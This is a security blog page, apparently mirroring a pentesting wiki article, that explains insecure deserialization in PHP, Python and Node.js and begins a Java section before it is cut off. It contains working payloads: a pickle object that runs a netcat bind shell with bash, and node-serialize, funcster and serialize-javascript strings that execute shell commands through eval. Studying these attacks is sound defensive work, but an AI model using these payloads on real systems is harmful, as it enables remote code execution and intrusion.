<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Deserialization | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚛️</text></svg>" > <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/deserialization/2025-01-05-deserialization/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repos/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">more </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/about/">about</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/news/">news</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"><div class="post"> <header class="post-header"> <h1 class="post-title">Deserialization</h1> <p class="post-description"></p> </header> <article> <h1 id="deserialization">Deserialization</h1> <h2 id="basic-information">Basic Information</h2> <p><strong>Serialization</strong> is understood as the method of converting an object into a format that can be preserved, with the intent of either storing the object or transmitting it as part of a communication process. This technique is commonly employed to ensure that the object can be recreated at a later time, maintaining its structure and state.</p> <p><strong>Deserialization</strong>, conversely, is the process that counteracts serialization. It involves taking data that has been structured in a specific format and reconstructing it back into an object.</p> <p>Deserialization can be dangerous because it potentially <strong>allows attackers to manipulate the serialized data to execute harmful code</strong> or cause unexpected behavior in the application during the object reconstruction process.</p> <h2 id="php">PHP</h2> <p>In PHP, specific magic methods are utilized during the serialization and deserialization processes:</p> <ul> <li><code class="language-plaintext highlighter-rouge">__sleep</code>: Invoked when an object is being serialized. This method should return an array of the names of all properties of the object that should be serialized. It’s commonly used to commit pending data or perform similar cleanup tasks.</li> <li><code class="language-plaintext highlighter-rouge">__wakeup</code>: Called when an object is being deserialized. It’s used to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks.</li> <li><code class="language-plaintext highlighter-rouge">__unserialize</code>: This method is called instead of <code class="language-plaintext highlighter-rouge">__wakeup</code> (if it exists) when an object is being deserialized. It gives more control over the deserialization process compared to <code class="language-plaintext highlighter-rouge">__wakeup</code>.</li> <li><code class="language-plaintext highlighter-rouge">__destruct</code>: This method is called when an object is about to be destroyed or when the script ends. It’s typically used for cleanup tasks, like closing file handles or database connections.</li> <li><code class="language-plaintext highlighter-rouge">__toString</code>: This method allows an object to be treated as a string. It can be used for reading a file or other tasks based on the function calls within it, effectively providing a textual representation of the object.</li> </ul> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">test</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$s</span> <span class="o">=</span> <span class="s2">"This is a test"</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">displaystring</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">s</span><span class="mf">.</span><span class="s1">'&lt;br /&gt;'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__toString</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'__toString method called'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="s2">"__construct method called"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="s2">"__destruct method called"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="s2">"__wakeup method called"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="n">__sleep</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="s2">"__sleep method called"</span><span class="p">;</span>
        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s2">"s"</span><span class="p">);</span> <span class="c1">#The "s" makes references to the public attribute</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">test</span><span class="p">();</span>
<span class="nv">$o</span><span class="o">-&gt;</span><span class="nf">displaystring</span><span class="p">();</span>
<span class="nv">$ser</span><span class="o">=</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
<span class="k">echo</span> <span class="nv">$ser</span><span class="p">;</span>
<span class="nv">$unser</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$ser</span><span class="p">);</span>
<span class="nv">$unser</span><span class="o">-&gt;</span><span class="nf">displaystring</span><span class="p">();</span>

<span class="cm">/*
php &gt; $o = new test();
__construct method called
__destruct method called
php &gt; $o-&gt;displaystring();
This is a test&lt;br /&gt;

php &gt; $ser=serialize($o);
__sleep method called

php &gt; echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php &gt; $unser=unserialize($ser);
__wakeup method called
__destruct method called

php &gt; $unser-&gt;displaystring();
This is a test&lt;br /&gt;
*/</span>
<span class="cp">?&gt;</span>
</code></pre></div></div> <p>If you look to the results you can see that the functions <strong><code class="language-plaintext highlighter-rouge">__wakeup</code></strong> and <strong><code class="language-plaintext highlighter-rouge">__destruct</code></strong> are called when the object is deserialized. Note that in several tutorials you will find that the <strong><code class="language-plaintext highlighter-rouge">__toString</code></strong> function is called when trying yo print some attribute, but apparently that’s <strong>not happening anymore</strong>.</p> <blockquote> <p>[!WARNING] The method <strong><code class="language-plaintext highlighter-rouge">__unserialize(array $data)</code></strong> is called <strong>instead of <code class="language-plaintext highlighter-rouge">__wakeup()</code></strong> if it is implemented in the class. It allows you to unserialize the object by providing the serialized data as an array. You can use this method to unserialize properties and perform any necessary tasks upon deserialization.</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">MyClass</span> <span class="p">{</span>
    <span class="k">private</span> <span class="nv">$property</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__unserialize</span><span class="p">(</span><span class="kt">array</span> <span class="nv">$data</span><span class="p">):</span> <span class="kt">void</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">property</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'property'</span><span class="p">];</span>
        <span class="c1">// Perform any necessary tasks upon deserialization.</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div> </div> </blockquote> <p>You can read an explained <strong>PHP example here</strong>: <a href="https://www.notsosecure.com/remote-code-execution-via-php-unserialize/">https://www.notsosecure.com/remote-code-execution-via-php-unserialize/</a>, here <a href="https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf">https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf</a> or here <a href="https://securitycafe.ro/2015/01/05/understanding-php-object-injection/">https://securitycafe.ro/2015/01/05/understanding-php-object-injection/</a></p> <h3 id="php-deserial--autoload-classes">PHP Deserial + Autoload Classes</h3> <p>You could abuse the PHP autoload functionality to load arbitrary php files and more:</p> <p>php-deserialization-+-autoload-classes.md</p> <h3 id="serializing-referenced-values">Serializing Referenced Values</h3> <p>If for some reason you want to serialize a value as a <strong>reference to another value serialized</strong> you can:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">AClass</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$param1</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$param2</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">WeirdGreeting</span><span class="p">;</span>
<span class="nv">$o</span><span class="o">-&gt;</span><span class="n">param1</span> <span class="o">=&amp;</span> <span class="nv">$o</span><span class="o">-&gt;</span><span class="n">param22</span><span class="p">;</span>
<span class="nv">$o</span><span class="o">-&gt;</span><span class="n">param</span> <span class="o">=</span> <span class="s2">"PARAM"</span><span class="p">;</span>
<span class="nv">$ser</span><span class="o">=</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
</code></pre></div></div> <h3 id="phpggc-ysoserial-for-php">PHPGGC (ysoserial for PHP)</h3> <p><a href="https://github.com/ambionics/phpggc"><strong>PHPGGC</strong></a> can help you generating payloads to abuse PHP deserializations.<br/> Note than in several cases you <strong>won’t be able to find a way to abuse a deserialization in the source code</strong> of the application but you may be able to <strong>abuse the code of external PHP extensions.</strong><br/> So, if you can, check the <code class="language-plaintext highlighter-rouge">phpinfo()</code> of the server and <strong>search on the internet</strong> (an even on the <strong>gadgets</strong> of <strong>PHPGGC</strong>) some possible gadget you could abuse.</p> <h3 id="phar-metadata-deserialization">phar:// metadata deserialization</h3> <p>If you have found a LFI that is just reading the file and not executing the php code inside of it, for example using functions like <em><strong>file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()</strong></em><strong>.</strong> You can try to abuse a <strong>deserialization</strong> occurring when <strong>reading</strong> a <strong>file</strong> using the <strong>phar</strong> protocol.<br/> For more information read the following post:</p> <p>../file-inclusion/phar-deserialization.md</p> <h2 id="python">Python</h2> <h3 id="pickle"><strong>Pickle</strong></h3> <p>When the object gets unpickle, the function ___reduce___ will be executed.<br/> When exploited, server could return an error.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">pickle</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">base64</span>
<span class="k">class</span> <span class="nc">P</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="nf">return </span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,(</span><span class="sh">"</span><span class="s">netcat -c </span><span class="sh">'</span><span class="s">/bin/bash -i</span><span class="sh">'</span><span class="s"> -l -p 1234 </span><span class="sh">"</span><span class="p">,))</span>
<span class="nf">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="nc">P</span><span class="p">())))</span>
</code></pre></div></div> <p>Before checking the bypass technique, try using <code class="language-plaintext highlighter-rouge">print(base64.b64encode(pickle.dumps(P(),2)))</code> to generate an object that is compatible with python2 if you’re running python3.</p> <p>For more information about escaping from <strong>pickle jails</strong> check:</p> <p>../../generic-methodologies-and-resources/python/bypass-python-sandboxes/</p> <h3 id="yaml--jsonpickle">Yaml <strong>&amp;</strong> jsonpickle</h3> <p>The following page present the technique to <strong>abuse an unsafe deserialization in yamls</strong> python libraries and finishes with a tool that can be used to generate RCE deserialization payload for <strong>Pickle, PyYAML, jsonpickle and ruamel.yaml</strong>:</p> <p>python-yaml-deserialization.md</p> <h3 id="class-pollution-python-prototype-pollution">Class Pollution (Python Prototype Pollution)</h3> <p>../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md</p> <h2 id="nodejs">NodeJS</h2> <h3 id="js-magic-functions">JS Magic Functions</h3> <p>JS <strong>doesn’t have “magic” functions</strong> like PHP or Python that are going to be executed just for creating an object. But it has some <strong>functions</strong> that are <strong>frequently used even without directly calling them</strong> such as <strong><code class="language-plaintext highlighter-rouge">toString</code></strong>, <strong><code class="language-plaintext highlighter-rouge">valueOf</code></strong>, <strong><code class="language-plaintext highlighter-rouge">toJSON</code></strong>.<br/> If abusing a deserialization you can <strong>compromise these functions to execute other code</strong> (potentially abusing prototype pollutions) you could execute arbitrary code when they are called.</p> <p>Another <strong>“magic” way to call a function</strong> without calling it directly is by <strong>compromising an object that is returned by an async function</strong> (promise). Because, if you <strong>transform</strong> that <strong>return object</strong> in another <strong>promise</strong> with a <strong>property</strong> called <strong>“then” of type function</strong>, it will be <strong>executed</strong> just because it’s returned by another promise. <em>Follow</em> <a href="https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/"><em><strong>this link</strong></em></a> <em>for more info.</em></p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// If you can compromise p (returned object) to be a promise</span>
<span class="c1">// it will be executed just because it's the return object of an async function:</span>
<span class="k">async</span> <span class="kd">function</span> <span class="nf">test_resolve</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">hello</span><span class="dl">"</span><span class="p">);</span>
    <span class="nf">resolve</span><span class="p">();</span>
  <span class="p">});</span>
  <span class="k">return</span> <span class="nx">p</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nf">test_then</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">((</span><span class="nx">then</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">hello</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">});</span>
  <span class="k">return</span> <span class="nx">p</span><span class="p">;</span>
<span class="p">}</span>

<span class="nf">test_ressolve</span><span class="p">();</span>
<span class="nf">test_then</span><span class="p">();</span>
<span class="c1">//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/</span>
</code></pre></div></div> <h3 id="__proto__-and-prototype-pollution"><code class="language-plaintext highlighter-rouge">__proto__</code> and <code class="language-plaintext highlighter-rouge">prototype</code> pollution</h3> <p>If you want to learn about this technique <strong>take a look to the following tutorial</strong>:</p> <p>nodejs-proto-prototype-pollution/</p> <h3 id="node-serialize"><a href="https://www.npmjs.com/package/node-serialize">node-serialize</a></h3> <p>This library allows to serialise functions. Example:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">y</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">rce</span><span class="p">:</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">child_process</span><span class="dl">"</span><span class="p">).</span><span class="nf">exec</span><span class="p">(</span><span class="dl">"</span><span class="s2">ls /</span><span class="dl">"</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">error</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">stdout</span><span class="p">);</span>
    <span class="p">});</span>
  <span class="p">},</span>
<span class="p">};</span>
<span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">node-serialize</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">payload_serialized</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">.</span><span class="nf">serialize</span><span class="p">(</span><span class="nx">y</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Serialized: </span><span class="se">\n</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">payload_serialized</span><span class="p">);</span>
</code></pre></div></div> <p>The <strong>serialised object</strong> will looks like:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"rce"</span>:<span class="s2">"_</span><span class="nv">$$</span><span class="s2">ND_FUNC</span><span class="nv">$$</span><span class="s2">_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"</span><span class="o">}</span>
</code></pre></div></div> <p>You can see in the example that when a function is serialized the <code class="language-plaintext highlighter-rouge">_$$ND_FUNC$$_</code> flag is appended to the serialized object.</p> <p>Inside the file <code class="language-plaintext highlighter-rouge">node-serialize/lib/serialize.js</code> you can find the same flag and how the code is using it.</p> <p><img src="../../images/image (351).png" alt=""/></p> <p><img src="../../images/image (446).png" alt=""/></p> <p>As you may see in the last chunk of code, <strong>if the flag is found</strong> <code class="language-plaintext highlighter-rouge">eval</code> is used to deserialize the function, so basically <strong>user input if being used inside the <code class="language-plaintext highlighter-rouge">eval</code> function</strong>.</p> <p>However, <strong>just serialising</strong> a function <strong>won’t execute it</strong> as it would be necessary that some part of the code is <strong>calling <code class="language-plaintext highlighter-rouge">y.rce</code></strong> in our example and that’s highly <strong>unlikable</strong>.<br/> Anyway, you could just <strong>modify the serialised object</strong> <strong>adding some parenthesis</strong> in order to auto execute the serialized function when the object is deserialized.<br/> In the next chunk of code <strong>notice the last parenthesis</strong> and how the <code class="language-plaintext highlighter-rouge">unserialize</code> function will automatically execute the code:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">node-serialize</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">test</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">rce</span><span class="p">:</span> <span class="dl">"</span><span class="s2">_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()</span><span class="dl">"</span><span class="p">,</span>
<span class="p">};</span>
<span class="nx">serialize</span><span class="p">.</span><span class="nf">unserialize</span><span class="p">(</span><span class="nx">test</span><span class="p">);</span>
</code></pre></div></div> <p>As it was previously indicated, this library will get the code after<code class="language-plaintext highlighter-rouge">_$$ND_FUNC$$_</code> and will <strong>execute it</strong> using <code class="language-plaintext highlighter-rouge">eval</code>. Therefore, in order to <strong>auto-execute code</strong> you can <strong>delete the function creation</strong> part and the last parenthesis and <strong>just execute a JS oneliner</strong> like in the following example:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">node-serialize</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">test</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">{</span><span class="se">\"</span><span class="s2">rce</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })</span><span class="se">\"</span><span class="s2">}</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">serialize</span><span class="p">.</span><span class="nf">unserialize</span><span class="p">(</span><span class="nx">test</span><span class="p">);</span>
</code></pre></div></div> <p>You can <a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/"><strong>find here</strong></a> <strong>further information</strong> about how to exploit this vulnerability.</p> <h3 id="funcster"><a href="https://www.npmjs.com/package/funcster">funcster</a></h3> <p>A noteworthy aspect of <strong>funcster</strong> is the inaccessibility of <strong>standard built-in objects</strong>; they fall outside the accessible scope. This restriction prevents the execution of code that attempts to invoke methods on built-in objects, leading to exceptions such as <code class="language-plaintext highlighter-rouge">"ReferenceError: console is not defined"</code> when commands like <code class="language-plaintext highlighter-rouge">console.log()</code> or <code class="language-plaintext highlighter-rouge">require(something)</code> are used.</p> <p>Despite this limitation, restoration of full access to the global context, including all standard built-in objects, is possible through a specific approach. By leveraging the global context directly, one can bypass this restriction. For instance, access can be re-established using the following snippet:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">funcster</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">funcster</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">//Serialization</span>
<span class="kd">var</span> <span class="nx">test</span> <span class="o">=</span> <span class="nx">funcster</span><span class="p">.</span><span class="nf">serialize</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="dl">"</span><span class="s2">Hello world!</span><span class="dl">"</span><span class="p">;</span>
<span class="p">});</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">test</span><span class="p">);</span> <span class="c1">// { __js_function: 'function(){return"Hello world!"}' }</span>

<span class="c1">//Deserialization with auto-execution</span>
<span class="kd">var</span> <span class="nx">desertest1</span> <span class="o">=</span> <span class="p">{</span> <span class="na">__js_function</span><span class="p">:</span> <span class="dl">'</span><span class="s1">function(){return "Hello world!"}()</span><span class="dl">'</span> <span class="p">};</span>
<span class="nx">funcster</span><span class="p">.</span><span class="nf">deepDeserialize</span><span class="p">(</span><span class="nx">desertest1</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">desertest2</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">__js_function</span><span class="p">:</span> <span class="dl">'</span><span class="s1">this.constructor.constructor("console.log(1111)")()</span><span class="dl">'</span><span class="p">,</span>
<span class="p">};</span>
<span class="nx">funcster</span><span class="p">.</span><span class="nf">deepDeserialize</span><span class="p">(</span><span class="nx">desertest2</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">desertest3</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">__js_function</span><span class="p">:</span>
    <span class="dl">"</span><span class="s2">this.constructor.constructor(</span><span class="se">\"</span><span class="s2">require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });</span><span class="se">\"</span><span class="s2">)()</span><span class="dl">"</span><span class="p">,</span>
<span class="p">};</span>
<span class="nx">funcster</span><span class="p">.</span><span class="nf">deepDeserialize</span><span class="p">(</span><span class="nx">desertest3</span><span class="p">);</span>
</code></pre></div></div> <p><strong>For</strong><a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/"> <strong>more information read this source</strong></a><strong>.</strong></p> <h3 id="serialize-javascript"><a href="https://www.npmjs.com/package/serialize-javascript"><strong>serialize-javascript</strong></a></h3> <p>The <strong>serialize-javascript</strong> package is designed exclusively for serialization purposes, lacking any built-in deserialization capabilities. Users are responsible for implementing their own method for deserialization. A direct use of <code class="language-plaintext highlighter-rouge">eval</code> is suggested by the official example for deserializing serialized data:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">deserialize</span><span class="p">(</span><span class="nx">serializedJavascript</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="nf">eval</span><span class="p">(</span><span class="dl">"</span><span class="s2">(</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">serializedJavascript</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">)</span><span class="dl">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p>If this function is used to deserialize objects you can <strong>easily exploit it</strong>:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">serialize-javascript</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">//Serialization</span>
<span class="kd">var</span> <span class="nx">test</span> <span class="o">=</span> <span class="nf">serialize</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
  <span class="k">return</span> <span class="dl">"</span><span class="s2">Hello world!</span><span class="dl">"</span><span class="p">;</span>
<span class="p">});</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">test</span><span class="p">);</span> <span class="c1">//function() { return "Hello world!" }</span>

<span class="c1">//Deserialization</span>
<span class="kd">var</span> <span class="nx">test</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()</span><span class="dl">"</span><span class="p">;</span>
<span class="nf">deserialize</span><span class="p">(</span><span class="nx">test</span><span class="p">);</span>
</code></pre></div></div> <p><strong>For</strong><a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/"> <strong>more information read this source</strong></a><strong>.</strong></p> <h3 id="cryo-library">Cryo library</h3> <p>In the following pages you can find information about how to abuse this library to execute arbitrary commands:</p> <ul> <li><a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/">https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/</a></li> <li><a href="https://hackerone.com/reports/350418">https://hackerone.com/reports/350418</a></li> </ul> <h2 id="java---http">Java - HTTP</h2> <p>In Java, <strong>deserialization callbacks are executed during the process of deserialization</strong>. This execution can be exploited by attackers who craft malicious payloads that trigger these callbacks, leading to potential execution of harmful actions.</p> <h3 id="fingerprints">Fingerprints</h3> <h4 id="white-box">White Box</h4> <p>To identify potential serialization vulnerabilities in the codebase search for:</p> <ul> <li>Classes that implement the <code class="language-plaintext highlighter-rouge">Serializable</code> interface.</li> <li>Usage of <code class="language-plaintext highlighter-rouge">java.io.ObjectInputStream</code>, <code class="language-plaintext highlighter-rouge">readObject</code>, <code class="language-plaintext highlighter-rouge">readUnshare</code> functions.</li> </ul> <p>Pay extra attention to:</p> <ul> <li><code class="language-plaintext highlighter-rouge">XMLDecoder</code> utilized with parameters defined by external users.</li> <li><code class="language-plaintext highlighter-rouge">XStream</code>’s <code class="language-plaintext highlighter-rouge">fromXML</code> method, especially if the XStream version is less than or equal to 1.46, as it is susceptible to serialization issues.</li> <li><code class="language-plaintext highlighter-rouge">ObjectInputStream</code> coupled with the <code class="language-plaintext highlighter-rouge">readObject</code> method.</li> <li>Implementation of methods such as <code class="language-plaintext highlighter-rouge">readObject</code>, <code class="language-plaintext highlighter-rouge">readObjectNodData</code>, <code class="language-plaintext highlighter-rouge">readResolve</code>, or <code class="language-plaintext highlighter-rouge">readExternal</code>.</li> <li><code class="language-plaintext highlighter-rouge">ObjectInputStream.readUnshared</code>.</li> <li>General use of <code class="language-plaintext 